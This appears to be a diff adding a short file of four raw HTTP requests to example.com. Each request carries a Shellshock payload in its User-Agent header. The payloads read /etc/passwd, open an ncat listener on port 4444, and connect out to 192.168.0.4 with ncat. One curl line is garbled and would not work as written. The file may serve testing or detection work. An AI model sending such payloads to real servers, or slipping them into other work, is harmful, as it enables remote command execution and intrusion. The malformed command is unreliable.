@@ -1,0 +1,19 @@
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
+Connection: keep-alive
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'curl -O /etc/passwd'
+Connection: keep-alive
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'ncat -lvp 4444'
+Connection: keep-alive
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.4'
+Connection: keep-alive
